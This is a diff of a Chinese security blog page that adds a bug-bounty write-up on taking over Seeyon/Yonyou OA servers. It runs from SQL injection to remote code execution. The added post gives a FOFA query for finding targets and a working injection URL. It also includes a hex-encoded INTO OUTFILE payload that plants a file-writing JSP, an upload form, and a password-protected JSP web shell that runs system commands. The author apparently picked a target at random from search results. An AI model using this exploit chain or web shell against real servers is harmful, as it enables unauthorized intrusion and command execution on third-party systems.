@@ -23,13 +23,22 @@
 <meta property="og:site_name" content="3xsh0re">
 <meta property="og:description" content="记一次由SQL注入到RCE😎">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-41-48.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-45-31.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-47-12.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-43-50.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-13-52.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-23-46.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png">
 <meta property="article:published_time" content="2023-09-04T03:41:06.000Z">
-<meta property="article:modified_time" content="2023-09-04T07:34:49.479Z">
+<meta property="article:modified_time" content="2023-09-04T08:29:22.277Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="SRC">
 <meta property="article:tag" content="SQL注入">
 <meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-41-48.png">
   
   
   
@@ -251,7 +260,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          15 字
+          2.3k 字
         
       </span>
     
@@ -262,7 +271,7 @@
         
         
         
-          1 分钟
+          20 分钟
         
       </span>
     
@@ -314,6 +323,47 @@
                 
                 <p>记一次由SQL注入到RCE😎</p>
 <span id="more"></span>
+
+<h3 id="fofa寻找到目标"><a href="#fofa寻找到目标" class="headerlink" title="fofa寻找到目标"></a>fofa寻找到目标</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">&quot;/yyoa&quot;</span>&amp;&amp;body!=<span class="hljs-string">&quot;您使用的浏览器不适合本系统运行要求&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>寻找到致远用友OA的站点</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-41-48.png" srcset="/img/loading.gif" lazyload></p>
+<p>寻找到一大堆，随便找一个访问啦</p>
+<h3 id="发现存在Nday——SQL注入"><a href="#发现存在Nday——SQL注入" class="headerlink" title="发现存在Nday——SQL注入"></a>发现存在Nday——SQL注入</h3><p>首先访问到登陆页面啦:<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp">http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp</a></p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-45-31.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接上工具扫：</p>
+<p>发现存在SQL注入Nday，那就不废话了，直接打POC：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://x.x.x.x:8001/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-47-12.png" srcset="/img/loading.gif" lazyload></p>
+<p>出现回显，SQL注入，直接一个妥妥的高危了</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-43-50.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="上传webshell拿到RCE"><a href="#上传webshell拿到RCE" class="headerlink" title="上传webshell拿到RCE"></a>上传webshell拿到RCE</h3><p>但是仅仅这样感觉太容易了，根路径都出来了，想拿个<code>webshell</code>试试，于是进行操作：</p>
+<p>首先我们不妨猜测一下网页路径：<code>Google</code>一下得到大概应该是这样的：<code>D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/</code></p>
+<p>然后得验证一下：</p>
+<p>使用<code>mysql</code>里自带的<code>load_file</code>函数验证一下：<code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p>
+<p>确实存在哈，lucky😊</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-13-52.png" srcset="/img/loading.gif" lazyload></p>
+<p>查阅了一下知识库，需要分两步走：</p>
+<p>利用<code>mysql into outfile</code>写<code>shell</code>：由于<code>jsp</code>一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造上传页面进行<code>RCE</code>脚本的上传</p>
+<h4 id="上传写文件脚本"><a href="#上传写文件脚本" class="headerlink" title="上传写文件脚本"></a>上传写文件脚本</h4><p>脚本内容如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-literal">null</span>)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过一个<code>f</code>参数上传脚本</p>
+<p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用<code>hex</code>编码后<code>unhex</code>函数处理上传，写入文件名为：<code>he1p.jsp</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27<br></code></pre></td></tr></table></figure>
+
+<p>上传成功👍</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="构造本地html上传RCE脚本"><a href="#构造本地html上传RCE脚本" class="headerlink" title="构造本地html上传RCE脚本"></a>构造本地html上传RCE脚本</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://x.x.x.x/yyoa/he1p.jsp?f=he11o.jsp&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">t</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">120</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">10</span> <span class="hljs-attr">width</span>=<span class="hljs-string">45</span>&gt;</span>your code<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>上传<code>RCE</code>脚本，这里尝试了蚁剑马和冰蝎马都连不上，最后选择了RCE这种方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;b&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-23-46.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传后在浏览器里输入：<code>http://x.x.x.x:8001/yyoa/he11o.jsp?pwd=b&amp;i=whoami</code>，即可执行系统命令</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png" srcset="/img/loading.gif" lazyload></p>
+<p>一个妥妥的高危到手👍👍👍</p>
 
                 
               </div>
